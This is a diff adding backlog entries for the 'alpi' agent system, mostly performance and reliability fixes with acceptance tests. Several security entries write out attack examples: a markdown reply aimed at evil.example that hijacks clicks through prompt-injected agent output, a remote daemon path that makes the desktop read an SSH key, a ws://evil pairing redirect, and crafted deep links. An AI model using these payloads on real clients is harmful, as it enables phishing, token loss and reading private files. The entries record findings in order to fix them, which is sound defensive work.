+  they are persisted and sent (no added delay); a wire send that does not finish in time marks the stream dead
+  while persistence continues to `done` and the session lock is released (a test with a `send_frame` that never
+  returns); an event subscriber that overflows is closed, so the client backfills through `host.events.history`.
+
+- **DAEMON.YAML-CACHE** — Configuration and connection files are parsed once per change (D14)
+  `chore · alpi · agent · normal`
+  note: `config.load` ([config.py](../alpi/config.py) `:425`) uses `yaml.safe_load` with no cache at 89 call sites:
+  1.9 ms each against 0.2 ms with `yamlfast`, on the loop every 5 s per profile (`service.py:554`, `:333`), in
+  `host.version` and on every ALP request. `connections.yaml` is read and written with the same loader
+  ([connections.py](../alpi/host/connections.py) `:394`, `:406`) and its handlers run their lock and parse on the
+  loop (`:1167-1330`): `register_device`, sent at every app launch, 18 ms. `_load_yaml` in `device_state.py`
+  (`:1853`) is the third.
+  accept: the three use `yamlfast.safe_load`; `config.load` caches the parsed file by `(mtime_ns, size)` and
+  returns a deep copy, with environment overrides still applied on every call; the connection handlers run off the
+  loop; tests: mutating a returned config leaves the next load intact, editing the file is seen at once, and the
+  libyaml edge cases `yamlfast` documents are covered.
+
+- **DAEMON.BLOBS-OFF-LOOP** — Large files are measured before they are read, and encoded off the loop (D12)
+  `bug · alpi · agent · normal`
+  note: `host.profile.read_file` reads the whole file on the loop and then cuts it to 256 KB
+  ([device_state.py](../alpi/host/device_state.py) `:367-369`), so reading `knowledge.sqlite` loads all of it.
+  `host.attachments.fetch` reads and base64-encodes on the loop before its size check
+  ([attachments_rpc.py](../alpi/host/attachments_rpc.py) `:240-247`), and `stage` decodes and writes there (`:74`,
+  `:93`). A 20 MB attachment blocks the loop about 0.7 s, most of it compression.
+  accept: `read_file` reads at most the cap plus one byte, inside `run_read`; `fetch` checks the size with `stat`
+  before reading; fetch and stage encode, decode and write in a thread; a test with a 50 MB sparse file asserts
+  the number of bytes read.
+
+- **DAEMON.HUB-CACHE** — Hub transcripts are parsed once and forgotten with their workgroup (D9, D11)
+  `chore · alpi · agent · low`
+  note: `_HUB_DECRYPT_CACHE` ([service.py](../alpi/service.py) `:2520`, `:2548`, `:2572`) keeps the ciphertext and
+  plaintext of every hub transcript for the life of the process, deleted workgroups included: 24 MB for 12
+  workgroups of 600 posts. `workgroup.pull` on the hub parses the whole `transcript.jsonl` on the loop for each
+  pull ([alp/workgroup.py](../alpi/alp/workgroup.py) `:1728-1757`, `:1033`) and each held long-poll stats it every
+  0.5 s.
+  accept: entries for workgroups absent from `active_hubs` are dropped in the prune loop that exists
+  (`service.py:1093-1100`); pulls share one parsed transcript keyed by `(mtime, size)`; a test deletes a workgroup
+  and finds no entry.
+
+- **DAEMON.LIST-LIMITS** — A list request with a limit builds only the rows it returns (D16)
+  `chore · alpi · agent · low`
+  note: `host.sessions.list` builds every row and applies `limit` afterwards
+  ([handlers.py](../alpi/host/handlers.py) `:93-99`); `host.runs.list` stats every journal and summarises 200
+  whatever the limit ([host/runs.py](../alpi/host/runs.py) `:35`); the session row cache of 8,192 entries is shared
+  by all profiles ([sessions.py](../alpi/host/sessions.py) `:110`), so five profiles of 2,000 sessions evict each
+  other.
+  accept: with `limit: 20` the two verbs open at most 20 files after ordering by the directory listing; the row
+  cache is sized per profile; tests count the files opened.
+
+#### Harness
+
+- **HARN.PRUNE-WATERMARK** — Old tool output is trimmed long before the context window fills (H2)
+  `feature · alpi · agent · high`
+  note: the cheap prune pass, which calls no model, runs only past `DEFAULT_TRIGGER_RATIO = 0.75` of the window
+  ([compaction.py](../alpi/compaction.py) `:24`, `:46-48`, `:169-178`; [engine.py](../alpi/engine.py) `:901`,
+  `:2036-2055`). On a 1M-token window that is 750,000 tokens, so it never runs and every step re-sends every earlier
+  tool output: a long turn sends millions of input tokens. A simulation calibrated to the fleet's long turns
+  (40 steps of about 5,000 tokens) drops from 4.4M to 2.9M input tokens with a 120,000-token threshold; a 12-step
+  turn is unchanged. Each prune breaks the provider cache from the first pruned message for one step, so it runs in
+  batches. Sibling of HARN.COMPACT-BATCH, which is about overflow; this is about cost.
+  accept: the prune pass (not the summary) also runs when the estimated prompt passes
+  `compaction.prune_after_tokens` (new key, default 120,000, 0 turns it off; CONFIG.md says the compaction ratios
+  become settings when traces ask for it, and this is the first, so that paragraph is rewritten), and only
+  when at least 20,000 tokens are prunable; the kept tail is intact and each pass writes a `prune` line to
+  `compaction.jsonl`; a fake-model test of 60 calls with 20,000-character results on a 1M window prunes mid-turn
+  without a summary call and with no more passes than its batches allow; a 12-step turn of 5,000-token results
+  never prunes.
+
+- **HARN.COMPLETE-TIMEOUT** — A model call that does not stream has a deadline and a retry (H3)
+  `bug · alpi · agent · normal`
+  note: `complete()` in [llm.py](../alpi/llm.py) (`:678-709`) passes no `timeout`, and the library's default is
+  6,000 seconds. Fourteen callers use it, among them `research` (`research.py:281,368`), `delegate`
+  (`delegate.py:350,434`), the compaction summary (`engine.py:2122,2177`), `web_extract`, `read_image` and
+  knowledge maintenance. `research` and `delegate` are exempt from the tool deadline because they "bound
+  themselves", but by steps and cost, not time, and on any exception they return "LLM call failed" and drop what
+  they gathered although `_partial_report` exists.
+  accept: `complete()` passes `runtime.stream_max_duration_s` as its timeout (`0` keeps it off) and retries a
+  transient error `runtime.max_retries` times with the existing `_is_transient` and `_backoff_sleep`; `research` and `delegate` return their
+  partial report on the final failure; fake-provider tests: a call that hangs raises within a small timeout, a
+  transient error then a success makes one retry, and `research` returns the partial report.
+
+- **HARN.SUMMARY-BACKOFF** — A failed compaction summary is not asked again on the next step (H4)
+  `bug · alpi · agent · normal`
+  note: when the summariser returns nothing, [engine.py](../alpi/engine.py) (`:2090-2126`) and
+  [compaction.py](../alpi/compaction.py) (`:470-484`) try again on every step with a window-sized prompt. With a
+  fake model on a 112,000-token window, ten steps made ten summary calls of about 83,000 tokens each, against two
+  calls when the summariser works.
+  accept: after an empty or failed summary the next attempt waits until the middle has grown by a quarter or five
+  steps have passed, and a `summary_failed` line is written to `compaction.jsonl`; a fake-model test with an empty
+  summariser makes at most two summary calls in ten steps.
+
+- **HARN.PREFIX-BY-ACTION** — Denying an action removes its parameters and its manual from the tool schema (H1)
+  `feature · alpi · agent · normal`
+  note: only `Knowledge` declares `action_parameters`
+  ([knowledge_base.py](../alpi/tools/knowledge_base.py) `:1400`; the mechanism is in
+  [tools/__init__.py](../alpi/tools/__init__.py) `:105-129` and [base.py](../alpi/tools/base.py) `:39`). `memory`
+  cut to `read` still carries its 4,914-character write manual and all seven parameters
+  ([memory.py](../alpi/tools/memory.py) `:75`); `skill` cut to three actions still carries 21 parameters
+  ([skill.py](../alpi/tools/skill.py) `:579`); `schedule` is the third ([schedule.py](../alpi/tools/schedule.py)
+  `:25`). Those three are 4,560 of the 14,712 schema tokens, and an action-level deny saves 39. The executor
+  already refuses a denied action.
+  accept: `Skill`, `Memory` and `Schedule` declare `action_parameters` and build their description from one
+  paragraph per action, so a denied action's enum value, its own parameters and its paragraph are absent; with no
+  deny, each of the three schemas is byte-identical to today's (deployed profiles keep their cached prefix);
+  `tests/test_tool_schemas_cacheable.py` gets a ceiling for a profile with `memory` read-only and `skill` limited
+  to `list`, `view` and `run`.
+
+- **HARN.PROMPT-SECTIONS** — The system prompt describes only the tools the profile has (H1)
+  `feature · alpi · agent · normal`
+  note: [prompt_cache.py](../alpi/prompt_cache.py) (`:142-180`) is deny-aware only for `knowledge_rule` (`:166`). A
+  profile without `skill`, the web tools or `memory` still receives the Skills (861 tokens), Web access (705),
+  Recall (628) and Memory (415) sections of [system_prompt.md](../alpi/prompts/system_prompt.md). The
+  pronoun-routing block is in both the `memory` description and the base prompt, and the "write in English" rule is
+  repeated in `memory`, `skill` and `schedule`. Changing the default prompt costs every profile one uncached
+  prefix on deploy.
+  accept: each of the four sections is rendered only when a tool it names is in the turn's schema set; the
+  pronoun-routing block and the language rule each appear once; a test builds the prompt for a profile that denies
+  `skill`, `memory` and the web tools and finds none of the four headings; the part order stays `PART_ORDER`.
+
+- **HARN.COLD-START** — Starting alpi makes no network call and a console command does not load the model library (H5)
+  `chore · alpi · agent · normal`
+  note: `import litellm` downloads its price map from GitHub at every process start unless
+  `LITELLM_LOCAL_MODEL_COST_MAP=true` is set (254 ms of its 1.1 s; the rest is the import itself), which sits oddly
+  beside `litellm.telemetry = False` in `_silence_litellm` ([llm.py](../alpi/llm.py) `:118-158`). alpi takes cost
+  from the provider and context windows from its own catalogue first. [cli.py](../alpi/cli.py) (`:18`) imports the
+  engine at module top, so `alpi --version` and `alpi runs list` take a second.
+  accept: `_silence_litellm` sets the variable with `os.environ.setdefault` before the import; a test in
+  `tests/test_llm_privacy.py` imports the library with sockets blocked and records no connection attempt; a
+  subprocess test runs `alpi --version` and finds neither `litellm` nor `alpi.engine` in `sys.modules`; the chat and
+  TUI commands import the engine when they run; SECURITY.md's `litellm` row says the price map is the bundled one.
+
+- **HARN.MCP-START** — MCP servers start together (H6)
+  `chore · alpi · agent · low`
+  note: servers spawn one after another inside `Engine.__init__`
+  ([mcp/registry.py](../alpi/mcp/registry.py) `:94-98`, [engine.py](../alpi/engine.py) `:332`): three servers of
+  0.5 s each cost 1.6 s before the first model byte, in every scheduled fire. Each MCP tool also carries a
+  52-token caveat (`_wrap_description`, `registry.py:244-252`), half of the schema tokens of a 45-tool server; it
+  is a security control and stays unless the creator says otherwise.
+  accept: servers are spawned concurrently, at most four at a time, and the registry is the same as a serial
+  start produces; a test with three fake servers that each sleep finds the total near one sleep, asserted by the
+  overlap of their start and end marks, not by time.
+
+- **HARN.BATCH-PARALLEL** — Read-only tool calls in one batch overlap (H7)
+  `feature · alpi · agent · low`
+  note: a batch runs in parallel only when every call is `parallel_safe`, and only `read_file`, `search`,
+  `web_fetch` and `web_search` are ([engine.py](../alpi/engine.py) `:1268-1293`,
+  [tool_executor.py](../alpi/core/tool_executor.py) `:151-170`). Three safe calls and one exclusive call run fully
+  in series. MCP tools, `knowledge` search, the session recall tools, `alpi_knowledge`, `skill` view and list, and
+  `memory` read never overlap.
+  accept: consecutive safe calls inside a mixed batch run together and results keep the order of the calls; the
+  read-only actions above are declared through `is_parallel_safe(arguments)`; an MCP tool with `readOnlyHint` is
+  safe; tests with fake tools assert the overlap and the order; the knowledge store and the embedder are exercised
+  from two threads.
+
+- **HARN.OUTPUT-CUT** — A cut tool result keeps its end, and the journal records its full size (H8)
+  `feature · alpi · agent · low`
+  note: `apply` in [_budget.py](../alpi/tools/_budget.py) (`:5`, `:29-35`) keeps the first 100,000 characters and
+  drops the rest, though a shell's error is usually at the end. The journal clips output to 12 KB, so the real
+  size distribution cannot be read from it.
+  accept: a cut keeps the head and the last fifth of the cap with one elision marker between them;
+  `tool.finished` carries `output_chars`, the length before the cut, optional for every reader; the default cap is
+  unchanged.
+
+- **HARN.SMALL-WASTE** — Five places where a turn spends a model call it does not need (H9, H11)
+  `bug · alpi · agent · low`
+  note: one per commit. The wrap-up call drops the tools array on the largest prompt of the turn
+  ([engine.py](../alpi/engine.py) `:1632-1673`), which changes the cached prefix: keep the schemas and pass
+  `tool_choice="none"`. The open-todo nudge has no limit (`:1115-1133`). `ProviderStreamDeadline` is retried like a
+  stall, so a slow call can run three times ([llm.py](../alpi/llm.py) `:669`). The fallback model is tried only
+  after every retry of the first. Candidate extraction after a compaction blocks the next step
+  (`engine.py:2171-2189`).
+  accept: a test per item: the wrap-up request carries the same tools as the step before it; the nudge fires at
+  most twice per turn; a deadline is not retried; the fallback is tried after the first stall; extraction runs
+  after the turn.
+
+- **HARN.019-VERIFY** — The prune threshold and the smaller prefix lower the cost on the deployed daemons
+  `verify · alpi · creator · normal`
+  depends: HARN.PRUNE-WATERMARK, HARN.PREFIX-BY-ACTION
+  accept: after a week on the release, from the ledgers: input tokens at the 90th percentile and the cache-hit rate
+  of the profiles with the longest turns, against the week before; the count of `prune` lines; no rise in
+  repeated-read tool calls, which would mean the model lost output it needed.
+
+#### Desktop
+
+- **DESK.SEC-MD-CLASS** — Markdown from the agent cannot use the app's own class names (DS1)
+  `bug · desktop · agent · high`
+  note: `PURIFY_OPTS` in [markdown.js](../desktop/src/lib/markdown.js) (`:88-100`) allows raw `div`, `a` and `button`
+  with a `class` attribute. CSS-module names are stable in a build (`._backdrop_1jzcr_1` is
+  `position: fixed; inset: 0` at a modal z-index), so an injected reply containing
+  `<a href="https://evil.example/?q=…" class="_backdrop_1jzcr_1">&nbsp;</a>` covers the window and any click opens
+  that URL in the browser. The sanitiser's output was verified; the visual result was not.
+  accept: the `afterSanitizeAttributes` hook keeps only the class tokens the renderer itself emits (list them
+  first; today they start with `md-` or `ch-`); `renderMarkdown('<a class="_backdrop_x" href="https://e">x</a>')`
+  contains no `_backdrop_x`; the table, code, figure and chart tests are unchanged.
+
+- **DESK.SEC-PATHS** — The desktop reads a local file only when the user or the local daemon named it (DS2)
+  `bug · desktop · agent · normal`
+  note: `path_within_allowed` in [lib.rs](../desktop/src-tauri/src/lib.rs) (`:2971-2998`) trusts the `roots` the
+  webview sends, and its own test (`:4414`) accepts `("/etc/hosts", ["/etc"])`.
+  [AttachmentChips.jsx](../desktop/src/primitives/AttachmentChips.jsx) (`:18-21`) and
+  [ProducedImages.jsx](../desktop/src/primitives/ProducedImages.jsx) (`:18-19`) pass `roots: [dirname(path)]` with
+  a path taken from session history, and `fileKind` calls anything with an `image/*` mime an image. A remote
+  daemon that returns `{path: "/Users/u/.ssh/id_ed25519", mime: "image/png"}` makes the desktop read that file into
+  the webview. No path sends the bytes back; it is a read the user did not ask for.
+  accept: `attachment_thumb` and `save_file_as` take the connection id; for a remote connection extra roots are
+  ignored and only a path registered in Rust state by `pick_files`, a drop or `save_text_file` is read; a file
+  that does not start with an image signature is not returned as a thumbnail; a Rust test reads nothing for an
+  unregistered file outside the fixed roots with `roots = [its directory]`; the local connection behaves as today.
+
+- **DESK.PERF-ROSTER** — A roster refresh that changes nothing re-renders nothing (DP1)
+  `bug · desktop · agent · high`
+  note: [useHostConnections.js](../desktop/src/hooks/useHostConnections.js) (`:278`) calls `setProfiles(ps)` with a
+  new array on every reload: the 60 s poll and each `session_changed`, config, schedule or workgroup event, at
+  least twice per turn. `profiles` is a prop of the memoised `Transcript`, `HistoryTurns` and `Turn`
+  ([ChatPane.jsx](../desktop/src/pages/ChatPane.jsx) `:490`, `:661`, `:717`), where `Turn` needs only the peer's
+  accent and shape, so every turn of the open session re-renders. Each `Turn` also holds its own
+  `subscribeTts(setTtsState)` (`:755`), so any speech state change re-renders them all.
+  accept: `setProfiles` and `setWorkgroups` are skipped when the serialised roster equals the last one
+  (`saveToCache` at `:185` already builds the string); `Turn` receives the derived accent and shape; speech state is
+  read through one `useSyncExternalStore` selector that answers "is my key active"; a test renders 50 turns with a
+  render counter, supplies an equal roster and emits a speech event for another key, and counts no `Turn` render.
+
+- **DESK.PERF-STREAM-MD** — A streaming answer parses only its open tail (DP3)
+  `bug · desktop · agent · normal`
+  note: every 50 ms flush, [StreamingMarkdown.jsx](../desktop/src/features/StreamingMarkdown.jsx) (`:40-56`) parses
+  and sanitises the whole message and replaces its HTML, and `renderMarkdown` stores every prefix as a cache key
+  ([markdown.js](../desktop/src/lib/markdown.js) `:115-129`). `marked` alone re-parses 250 MB for a 100 KB answer
+  (8 s) and 1 GB for 200 KB; one 100 KB answer keeps 345 MB in the cache until 500 later renders evict it, and
+  evicts the finished messages' entries. Selection in the streaming message is lost at each flush.
+  accept: streaming text bypasses the cache; the stream is split at the last top-level token boundary
+  (`marked.lexer` tokens carry `raw`), closed blocks are memoised children and only the tail is parsed again; a
+  test streams a 200 KB document in 20-character deltas and finds the total characters parsed under three times
+  the document, the cache size unchanged and the earlier block nodes kept; the final HTML equals the non-streaming
+  render for documents with a chart, a table, a loose list and reference-style links.
+
+- **DESK.PERF-STREAM-STORE** — Streaming re-renders the answer, not the app (DP4)
+  `bug · desktop · agent · normal`
+  note: `pendingTurns` is state of `App` ([useChatStream.js](../desktop/src/hooks/useChatStream.js) `:29`,
+  [App.jsx](../desktop/src/App.jsx) `:412`), so each flush re-runs `App` and re-renders `Sidebar` (its memo broken
+  by a new `pendingProfiles` set, `:1063-1069`), the composer, the header, the palette (`useCommands` recomputes,
+  `:1442`) and the panels; the global `keydown` listener is removed and added again (`:1000-1035`) and the stall
+  watchdog interval is recreated (`useChatStream.js:347-362`).
+  accept: pending turns live in a module store read with `useSyncExternalStore`; `App` selects the key string of
+  the pending profiles and the foreground turn's status, and only `PendingTurn` subscribes to the text; an
+  `App.mount` test with render counters pushes 20 `assistant_delta` frames and counts no render of `Sidebar` or
+  `ChatComposer`.
+
+- **DESK.PERF-WINDOW** — A long session loads and draws the part the user is looking at (DP2)
+  `feature · desktop · agent · normal`
+  note: [session-open.js](../desktop/src/lib/session-open.js) (`:9-10`, `:72-107`) loads the last 60 turns and then
+  every earlier one in chunks of 100; `HistoryTurns` maps them all (`ChatPane.jsx:681`). A 2,000-turn session costs
+  20 requests, 2,000 mounts and 4,000 markdown parses, and stays in `_memory`
+  ([session-cache.js](../desktop/src/lib/session-cache.js) `:10`) with no cap.
+  accept: an earlier chunk is requested only when the scroll nears the top (`useScrollAnchor` already compensates
+  for prepends); `.turn` has `content-visibility: auto` with a `contain-intrinsic-size`; `_memory` keeps the eight
+  most recent sessions; transcript search and export load the remaining turns before they run; tests cover the
+  request trigger, the eviction and a search hit in a turn that was not loaded.
+
+- **DESK.WATCHER** — Local file changes do not refresh a remote daemon's roster (DP6)
+  `bug · desktop · agent · normal`
+  note: [watcher.rs](../desktop/src-tauri/src/watcher.rs) (`:42-68`) watches `~/.alpi` recursively and `App.jsx`
+  (`:818`) applies `fs-change` whatever the active connection, so the local daemon's writes reload a remote roster,
+  and on a local connection each session save triggers both `fs-change` and `session_changed`. It also sits badly
+  with the rule that clients reach the daemon through `host.*` only.
+  accept: `fs-change` is ignored unless the active connection is local; an `App` test with a remote connection
+  sends `fs-change` and counts no `profile_summaries` call. The note of the commit lists every writer outside the
+  daemon (TUI, CLI) and whether it reaches the host event bus, which decides a later entry that removes the
+  watcher.
+
+- **DESK.PERF-THUMBS** — A thumbnail is a small image, and the image cache has a size (DP5)
+  `chore · desktop · agent · low`
+  note: `attachment_thumb` ([lib.rs](../desktop/src-tauri/src/lib.rs) `:3001-3020`) returns the whole file, up to
+  6 MB, as a data URL and [markdownImages.js](../desktop/src/lib/markdownImages.js) (`:12`) keeps every one for the
+  life of the app.
+  accept: the image is scaled once to the tile size and kept as an object URL in a bounded LRU; the full file is
+  read only for the lightbox; the scaler is injected so a unit test covers the LRU and the eviction's
+  `revokeObjectURL`.
+
+- **DESK.BRIDGE** — The bridge reuses its TLS setup, probes less and backs off when a daemon refuses (DP7, DP8, DP10)
+  `chore · desktop · agent · low`
+  note: one per commit. [host_client.rs](../desktop/src-tauri/src/host_client.rs) builds a root store and a client
+  config per connection (`:2282-2291`), so no TLS session is resumed; a stream frame is parsed twice
+  (`:1919-1925`, `:2001-2006`). The 30 s probe loop (`lib.rs:4126-4129`) calls `host.profiles.list`, discards it,
+  and rewrites `connections.json` each time. A stream that ended on an error frame counts as success
+  (`lib.rs:3862-3866`), so a daemon answering `too-many-connections` is retried every 2 s, and the path without a
+  device id probes every 2 s with no backoff (`:3728-3732`). `MemoryModal.jsx` (`:100-108`) and `ScheduleModal.jsx`
+  (`:114-129`) reload once per replayed frame.
+  accept: one shared client config (a test compares the pointer of two connects); the probe is skipped while a
+  stream frame is recent, calls `host.version` only and persists `last_connected` at most hourly; the sleep
+  decision is a pure function in `event_dispatch.rs`, tested for both cases; the two modals coalesce with the
+  300 ms window `useProfileSnapshot.js` uses.
+
+#### Mobile
+
+- **MOB.SEC-PAIR** — Pairing never replaces a saved connection's address or token unseen (M-S1, M-S2)
+  `bug · mobile · agent · high`
+  note: `saveConnection` in [store.js](../mobile/src/lib/store.js) (`:136-146`) replaces the single saved
+  connection whose `deviceId` equals the one the answering daemon reports, keeping its local id and role and taking
+  the new URL, token and label. Every authenticated client sees a daemon's `device_id` in `host.version`, so an
+  endpoint that answers `exchange_pairing` with a victim daemon's id redirects that connection and destroys its
+  token. `handleScan` in [pair.jsx](../mobile/app/pair.jsx) (`:203-208`) pairs at once, with no host confirmation
+  (the confirm at `:123` fires only for a link routed from outside), and `parseJson` in
+  [pairing.js](../mobile/src/lib/pairing.js) (`:88-105`) accepts a raw `token`, although the daemon's QR carries
+  only a one-time grant.
+  accept: a connection is replaced only when matched by its local id, by device id and connection id together, or
+  by device id when the URL host equals the saved one; otherwise a second row is added (two routes to one daemon
+  already work as a group); a scanned payload with `token` or `t` is refused, and a scan whose host matches no
+  saved connection opens the existing host confirm; tests: saving `{deviceId: 'D', url: 'ws://evil'}` over
+  `{deviceId: 'D', url: 'ws://a'}` yields two connections and the first keeps its token; `handleScan` with a token
+  never calls `addConnection`.
+
+- **MOB.RECOVER-PAGING** — Recovering a turn after a stall replays all of it (M8)
+  `bug · mobile · agent · high`
+  note: `tryRecoverFromSidecar` in [useChatSend.js](../mobile/src/hooks/useChatSend.js) (`:277-303`) asks
+  `host.chat.events_since` with `after_seq: 0, limit: 1000`, clears the visible turn and applies that one page. The
+  daemon stores a frame per token, so a turn passes 1,000 frames in 12 to 33 seconds: the reply shrinks to an
+  earlier prefix, `sawDone` stays false and the same page is fetched again 15 s later.
+  accept: the hook pages with `after_seq = next_seq` until a short page and applies the frames only when it has
+  them all; the visible turn is not cleared before that; a test with a fake `call` returning 1,000 events and then
+  200 with `done` finds the text of both pages and `recovered` true.
+
+- **MOB.PROBE-FLICKER** — An unreachable daemon stays "offline" between retries (M7)
+  `bug · mobile · agent · high`
+  note: [EndpointProvider.jsx](../mobile/src/lib/EndpointProvider.jsx) sets `'probing'` at every retry (`:36-40`)
+  on a fixed 4 s interval that ignores `AppState` (`:131-139`), and `DaemonBanner` does not count `'probing'` as
+  down (`:27-30`). With a host that drops packets the banner unmounts and returns each cycle, the composer and
+  every inbox row toggle, and all 68 `useEndpoint()` consumers render twice per cycle.
+  accept: `'probing'` is set only while there is no settled status; retries back off 4, 8, 16, 30 s and stop while
+  the app is not active; a test with a probe that resolves `offline` advances the timers and finds the state never
+  leaves `'offline'` and the probe count on the backoff.
+
+- **MOB.PERF-OUTPUTS** — The unread count costs one request (M3)
+  `bug · mobile · agent · high`
+  note: [useUnifiedOutputs.js](../mobile/src/hooks/useUnifiedOutputs.js) (`:33-65`, `:116-149`) calls
+  `host.profile.summaries` and then `host.outputs.list` per profile, 100 rows with full bodies, on mount, on every
+  output event and on every status change, in each of its three consumers; two of them use only the length. The
+  daemon serves `host.outputs.list {all: true}` with an `aggregate` marker and the desktop uses it
+  ([useOutputs.js](../desktop/src/hooks/useOutputs.js)). Each per-profile call costs the daemon a full inbox read,
+  and they queue on the phone's single socket.
+  accept: the hook asks `{all: true, status, limit}` first and falls back to the fan-out only when the reply lacks
+  `aggregate`; one module-level store serves every consumer of the same connection set; a test with an rpc spy
+  counts one call on a daemon that aggregates and 1 + N on an older one.
+
+- **MOB.SEC-INTENT** — A link opened by the system reaches only known routes with known parameters (M-S4)
+  `bug · mobile · agent · normal`
+  note: `redirectSystemPath` in [+native-intent.js](../mobile/app/+native-intent.js) (`:20-24`) rewrites pairing
+  links, strips `draft` and passes every other path and query through; the project's own test states it.
+  `alpi://profile/<p>/peers/accept?pubkey=K&address=A&suggested=h` opens Accept peer filled in
+  ([accept.jsx](../mobile/app/profile/[id]/peers/accept.jsx) `:24-58`), where one tap calls
+  `host.peers.pending_accept` with an address the link chose. `?intent=delete` opens the delete confirm and
+  `alpi://paired?host=…&role=admin` shows a success page.
+  accept: `redirectSystemPath` applies the allow-list `internalLink` uses for notification links and keeps only the
+  query keys a route declares (`sid`, `connectionId`); anything else returns `'/'`; the accept screen reads the
+  key and address from `host.peers.pending_list`; tests: the accept link returns `'/'`, a pairing link still
+  returns `/pair?…`, and the existing "leaves every other route untouched" case is replaced.
+
+- **MOB.SEC-LOCK** — The app lock covers notification actions and returns after a while in the background (M-S5)
+  `bug · mobile · agent · normal`
+  note: the biometric gate runs at cold start only ([AppBootstrap.jsx](../mobile/src/lib/AppBootstrap.jsx)
+  `:26-43`). `useNotificationTapRouter` runs outside it ([_layout.jsx](../mobile/app/_layout.jsx) `:106`), so
+  "Allow once" on a notification calls `host.approval.respond`
+  ([deeplink.js](../mobile/src/features/aln/deeplink.js) `:42-54`, `:86-92`, `:111-115`) while the locked view is
+  showing, and after the first unlock the app never locks again.
+  accept: with the lock on, a notification action authenticates before it responds; the app locks after five
+  minutes in the background and shows the lock view while inactive; tests with a gate stub that refuses (no
+  `respond` call) and a fake `AppState` (six minutes away sets `locked`). Its device check is MOB.CLIENT-VERIFY.
+
+- **MOB.SEC-CLEARTEXT** — Pairing over an unencrypted link outside the overlay network says so (M-S3)
+  `feature · mobile · agent · normal`
+  note: [endpoint.js](../mobile/src/lib/endpoint.js) (`:8`) accepts `ws://` to any host and the device token rides
+  in every request frame ([rpc.js](../mobile/src/lib/rpc.js) `:118-122`). Cleartext is right for a Tailscale
+  address, but nothing tells `100.64.0.0/10` from `ws://192.168.1.5`, where anyone on the network reads the token.
+  accept: a pure `isOverlayHost(url)` (`100.64.0.0/10`, `fd7a:115c:a1e0::/48`, `*.ts.net`, loopback) with a table
+  test; for `ws:` to any other host the pairing confirm says the link is not encrypted and the connection page
+  keeps that fact visible. The interface follows board UI-MOB.SEC-CLEARTEXT; draw and approve it before this moves
+  to Queue.
+
+- **MOB.PERF-STREAM** — A streamed token re-renders the last message only (M1, M2)
+  `bug · mobile · agent · normal`
+  note: deltas are merged per animation frame, but `setPendingTurn` lives in the 500-line `ProfileChatInner`
+  ([useChatSend.js](../mobile/src/hooks/useChatSend.js) `:89-105`, [chat/[id].jsx](../mobile/app/chat/[id].jsx)
+  `:484`), so each frame re-renders the header and the composer (neither is memoised and both receive new props),
+  the sheets and every mounted list cell, because `visibleWindow` builds new wrappers
+  ([chatWindow.js](../mobile/src/lib/chatWindow.js) `:2-8`). [RichText.jsx](../mobile/src/components/RichText.jsx)
+  (`:218-290`) recreates every block with index keys, about 185 for an 8 KB reply, and `TurnBlock` recomputes its
+  parts and tools. `held` in [Fold.jsx](../mobile/src/components/Fold.jsx) (`:81`) is a new array per render,
+  captured by two worklets.
+  accept: the pending turn lives in a store read with `useSyncExternalStore`; the screen selects `isStreaming`,
+  `error` and `cancelled`, and the list subscribes to the turn; cell wrappers are cached by turn identity;
+  `RichText` reuses an equal block and renders through a memoised `Block`; `held` is memoised; a test pushes 100
+  deltas with a fake `requestAnimationFrame` and finds the render counts of the header and composer flat and only
+  the last cell rendered again. Its device check is MOB.CLIENT-VERIFY.
+
+- **MOB.PERF-RESUME** — Returning to the app asks each thing once (M4)
+  `bug · mobile · agent · normal`
+  note: on resume `host.profile.summaries` runs three times (the probe at
+  [probe.js](../mobile/src/lib/probe.js) `:27` outside the shared cache, the kept-current hook, and the
+  invalidation 800 ms after reconnect at `app/index.jsx:93-110`), workgroups, activity and event history twice
+  each, and a finished turn costs about six requests. `usePolledCall` refetches on every mount
+  ([useDaemonData.js](../mobile/src/hooks/useDaemonData.js) `:178-189`). First fix the latent bug these refetches
+  hide: `useInbox` memoises its items on `checkProfile` and `checkWorkgroup`, which never change identity
+  ([readState.js](../mobile/src/lib/readState.js) `:117-124`), so unread dots clear only because the data arrives
+  again.
+  accept: an unread dot clears with no refetch (a test); the probe's summaries go through `fetchAndStore`; a mount
+  or invalidation is skipped when the data is under two seconds old; `session_changed` no longer invalidates
+  workgroups; a test with an rpc counter, a fake `AppState` change to active and a `subscribed` frame counts one
+  summaries call.
+
+- **MOB.PERF-WG-TAIL** — An open workgroup fetches only the new posts (M5)
+  `bug · mobile · agent · normal`
+  note: `useWorkgroupTranscript` asks `tail: true, limit: 200` on every `wg.post`, `wg.done` and `wg.blocked`
+  ([useDaemonData.js](../mobile/src/hooks/useDaemonData.js) `:349-357`); the daemon decrypts and ships 200 posts,
+  every post object is new and every visible item re-renders ([wg/[id].jsx](../mobile/app/wg/[id].jsx)
+  `:390-400`). The daemon's transcript verb takes `after_seq`.
+  accept: a store per endpoint, profile and workgroup fetches `after_seq: lastSeq` and appends; earlier post
+  objects keep their identity; a reply that ignores `after_seq` is handled as a full tail; a test for each.
+
+- **MOB.PERF-IMAGES** — Agent images are files on disk, not strings in memory (M6)
+  `chore · mobile · agent · low`
+  note: a fetched image arrives as a frame of up to 27 MB, is parsed and joined into a `data:` URI (three copies on
+  the JS thread), is kept among up to 32 such strings for the life of the process
+  ([useCachedImage.js](../mobile/src/hooks/useCachedImage.js) `:5-6`, `:34-38`) and is sent to native twice. There
+  is no disk cache.
+  accept: the bytes are written under `cacheDirectory/alpi-img/<hash>` with `expo-file-system`, `<Image>` receives
+  the `file://` URI and the map holds URIs only; the directory is removed on unpair and forget; a test with a
+  mocked file system finds no string over 1 KB in the map.
+
+- **MOB.PERF-CACHES** — Background bookkeeping writes when something changed, and caches forget (M9, M11)
+  `chore · mobile · agent · low`
+  note: the foreground catch-up runs every 30 s per daemon and `recordGroupHealth` always writes the keychain
+  ([poll.js](../mobile/src/features/aln/poll.js) `:43-50`): 120 writes an hour per daemon with nothing new. Its
+  interval equals the stale-socket window (`rpc.js:116`), so reuse of the pooled socket depends on timer jitter.
+  The session, workgroup and activity stores never evict, and `forget(connection)` leaves that connection's text in
+  memory ([useSessionTranscript.js](../mobile/src/hooks/useSessionTranscript.js) `:9`, `useDaemonData.js:12`,
+  `useActivity.js:98`).
+  accept: the health write is skipped when its three fields are unchanged and the last write is under five minutes
+  old; the stale window is 45 s; stores drop entries with no listener beyond the eight most recent and purge by
+  endpoint on forget and unpair; tests for each.
+
